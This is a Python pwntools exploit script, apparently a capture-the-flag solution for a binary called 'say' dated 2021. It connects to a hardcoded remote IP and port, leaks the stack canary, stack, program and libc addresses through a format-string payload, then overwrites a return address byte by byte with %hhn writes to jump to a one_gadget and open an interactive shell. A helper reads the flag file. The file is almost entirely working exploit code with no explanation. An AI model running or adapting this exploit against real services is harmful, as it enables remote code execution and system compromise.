# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './say'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '1.116.140.142'
    port = '60010'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

one_gad = one_gadget(libc.path)

def attack():
    
    payload = '%42$p,%45$p,%46$p,%48$p,'
    # dbg('sprintf')
    # dbg('puts')

    sla('what???\n',payload)

    ru('0x')
    canary = rint(16)
    ru('0x')
    stack_addr = rint()
    ru('0x')
    elf_base = rint()
    ru('0x')
    libc.address = rint() - libc.sym['__libc_start_main'] - 231
    
    # dbg()

    lg('libc.address',libc.address)


    return_addr = stack_addr - 0x18
    ogg = one_gad[1] + libc.address

    payload = '%' + str((return_addr & 0xff)- 0x10) +'c%41$hhn'
    sla('what???\n',payload)
    payload = '%' + str((ogg & 0xff)- 0x10) +'c%45$hhn'
    sla('what???\n',payload)

    payload = '%' + str(((return_addr +1) & 0xff)- 0x10) +'c%41$hhn'
    sla('what???\n',payload)
    payload = '%' + str(((ogg>>8) & 0xff)- 0x10) +'c%45$hhn'
    sla('what???\n',payload)

    payload = '%' + str(((return_addr +2) & 0xff)- 0x10) +'c%41$hhn'
    sla('what???\n',payload)
    payload = '%' + str(((ogg>>16) & 0xff)- 0x10) +'c%45$hhn'
    sla('what???\n',payload)

    payload = '%' + str(((return_addr +3) & 0xff)- 0x10) +'c%41$hhn'
    sla('what???\n',payload)
    payload = '%' + str(((ogg>>24) & 0xff)- 0x10) +'c%45$hhn'
    sla('what???\n',payload)

    payload = '%' + str(((return_addr +4) & 0xff)- 0x10) +'c%41$hhn'
    sla('what???\n',payload)
    payload = '%' + str(((ogg>>32) & 0xff)- 0x10) +'c%45$hhn'
    sla('what???\n',payload)

    payload = '%' + str(((return_addr +5) & 0xff)- 0x10) +'c%41$hhn'
    sla('what???\n',payload)
    payload = '%' + str(((ogg>>40) & 0xff)- 0x10) +'c%45$hhn'
    sla('what???\n',payload)



    lg('((ogg>>48) & 0xff)',((ogg>>40) & 0xff))
    lg('ogg',ogg)

    sla('what???\n','exit')


    # dbg()


    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   say.py
@Time    :   2021/12/05 11:50:42
@Author  :   Niyah 
'''